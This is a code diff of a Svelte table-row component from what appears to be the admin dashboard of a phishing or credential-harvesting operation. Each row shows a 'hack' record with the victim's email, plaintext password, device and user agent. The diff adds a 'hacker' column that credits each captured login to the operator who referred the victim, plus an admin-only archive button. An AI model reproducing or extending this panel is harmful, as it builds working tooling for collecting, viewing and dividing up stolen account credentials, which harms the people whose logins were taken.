@@ -1,19 +1,34 @@
 <script>
-    import { updateHack } from "$lib/actions";
-    import { allHacksList, hacksList, user } from "$lib/stores/user-store";
+  import { updateHack } from "$lib/actions";
+  import {
+    allHacksList,
+    allUsersList,
+    hacksList,
+    user,
+  } from "$lib/stores/user-store";
 
   // import { db } from "./firebase.js";
   import CopyButton from "./CopyButton.svelte";
   import DeviceIcon from "./DeviceIcon.svelte";
   import moment from "moment";
   export let hack;
+  export let isShowHacker=false;
 
   async function archive() {
-    console.log('archived successfully')
-    $hacksList=$hacksList.filter((e)=>e.id!==hack.id)
-    $allHacksList=$allHacksList.filter((e)=>e.id!==hack.id)
-    await updateHack(hack.id,{archived:true})
+    console.log("archived successfully");
+    $hacksList = $hacksList.filter((e) => e.id !== hack.id);
+    $allHacksList = $allHacksList.filter((e) => e.id !== hack.id);
+    await updateHack(hack.id, { archived: true });
     // db.collection("hacks").doc(hack.id).update({ archived: true });
+  }
+
+  function findHacker() {
+    console.log('hack0',hack)
+    console.log('hack0',hack)
+    if (!hack.ref) return "***";
+    let hacker = $allUsersList.find((u) => u.ref === hack.ref);
+    console.log(hacker)
+    return hacker.displayName;
   }
 </script>
 
@@ -29,8 +44,17 @@
       </div>
     </div>
   </td>
+  {#if isShowHacker}
+    <td>
+      <div class="onelineeven">
+        <p class="mdc-typography--body2">
+          {findHacker()}
+        </p>
+      </div>
+    </td>
+  {/if}
   <td>
-    <div  class="onelineeven">
+    <div class="onelineeven">
       <p class="mdc-typography--body2">
         {hack.email}
       </p>
@@ -38,7 +62,7 @@
     </div>
   </td>
   <td>
-    <div  class="onelineeven">
+    <div class="onelineeven">
       <p class="mdc-typography--body2">
         {hack.password}
       </p>
@@ -57,7 +81,7 @@
   </td>
   <td>
     {#if hack.userAgent}
-      <div  class="onelineeven">
+      <div class="onelineeven">
         <p class="userAgentText">
           {hack.userAgent}
         </p>
@@ -66,25 +90,24 @@
     {/if}
   </td>
   {#if $user.isAdmin}
-    
-  <td>
-    <div style="padding-left: 4px;">
-      <button on:click={archive}>recycle</button>
-    </div>
-  </td>
+    <td>
+      <div style="padding-left: 4px;">
+        <button on:click={archive}>recycle</button>
+      </div>
+    </td>
   {/if}
 </tr>
 
 <style>
-  .userAgentText{
+  .userAgentText {
     font-size: 10px;
     font-family: roboto, sans-serif;
     max-width: 300px;
     text-wrap: wrap;
   }
-  .time-text{
+  .time-text {
     font-family: roboto;
-    font-size:10px;
+    font-size: 10px;
   }
   td {
     padding-right: 12px;
@@ -96,12 +119,10 @@
     gap: 4px;
   }
 
-
   .onelineeven {
     display: flex;
     /* justify-content: space-around; */
     align-items: center;
-
   }
   .bordered {
     padding: 2px 4px;
